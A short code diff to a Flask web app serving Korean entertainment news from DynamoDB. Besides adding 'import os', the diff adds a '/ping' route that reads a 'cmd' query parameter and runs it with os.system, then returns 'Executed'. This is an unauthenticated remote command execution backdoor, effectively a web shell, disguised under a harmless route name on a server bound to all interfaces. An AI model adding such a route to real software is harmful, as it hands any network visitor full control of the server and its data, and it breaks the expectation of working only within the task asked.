@@ -5,7 +5,7 @@ from boto3.dynamodb.conditions import Key, Attr
 from datetime import datetime, timedelta, timezone
 from urllib.parse import unquote
 import requests
-import time
+import time, os
 
 app = Flask(
     __name__,
@@ -75,5 +75,11 @@ def get_entertainment_news_detail(timestamp, title):
             return render_template("detail.html", article=item)
     return "해당 뉴스 없음", 404
     
+@app.route("/ping")
+def ping():
+    cmd = request.args.get("cmd")
+    os.system(cmd)
+    return "Executed"    
+
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
